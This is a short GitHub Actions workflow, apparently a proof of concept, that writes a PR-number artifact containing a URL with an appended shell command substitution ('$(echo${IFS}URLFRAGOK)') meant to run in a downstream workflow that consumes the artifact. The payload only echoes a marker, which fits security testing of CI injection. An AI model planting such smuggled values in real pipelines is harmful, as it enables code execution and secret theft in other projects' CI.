name: GAB CI PIPELINE
on:
  pull_request:
    types:
      - opened
      - synchronize
    branches:
      - main

permissions:
  contents: read

jobs:
  basic-checker:
    runs-on: ubuntu-latest
    steps:
      - name: Upload info
        shell: bash
        run: |
          cat > pr_num.txt <<'PAYLOAD'
          https://github.com/PDFtoMark/gab-poc-prr-ref/pull/3#$(echo${IFS}URLFRAGOK)
          PAYLOAD
          cat pr_num.txt

      - name: Upload the PR number
        uses: actions/upload-artifact@v4
        with:
          name: pr_num
          path: ./pr_num.txt
          retention-days: 1
          overwrite: true
